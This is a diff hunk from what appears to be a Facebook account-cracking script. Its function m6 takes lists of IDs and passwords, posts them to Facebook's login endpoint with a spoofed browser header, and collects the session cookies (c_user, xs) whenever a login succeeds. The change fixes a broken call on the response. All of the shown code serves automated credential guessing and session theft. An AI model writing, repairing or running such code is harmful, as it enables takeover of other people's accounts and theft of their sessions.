@@ -1521,8 +1521,7 @@ def m6(ids,pwv):
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
             'viewport-width': '885',}
-            future =session.post('https://www.facebook.com/login/device-based/regular/login/',data=info,headers=update).text
-            response = future.result()
+            session.post('https://www.facebook.com/login/device-based/regular/login/',data=info,headers=update).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
